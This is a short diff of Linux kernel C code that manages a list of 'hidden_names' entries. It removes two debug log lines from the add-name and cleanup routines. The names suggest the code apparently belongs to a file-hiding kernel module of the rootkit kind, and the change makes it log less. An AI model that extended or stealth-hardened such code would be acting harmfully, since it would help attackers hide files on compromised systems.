@@ -173,7 +173,6 @@ static int _fs_add_name(const char *names[], bool ro, u64 ino) {
             if (!hn)
                 return -ENOMEM;
 
-            prinfo("addname '%s' ro=%d\n", *s, ro);
             hn->name = kcalloc(1, len+1, GFP_KERNEL);
             strncpy(hn->name, (const char*)*s, len);
             hn->ro = ro;
@@ -223,7 +222,6 @@ bool fs_del_name(const char *names[]) {
 void fs_names_cleanup(void) {
     struct hidden_names *node, *node_safe;
     list_for_each_entry_safe(node, node_safe, &names_node, list) {
-        prinfo("cleaning '%s'\n", node->name);
         list_del(&node->list);
         if (node->name)
             kfree(node->name);
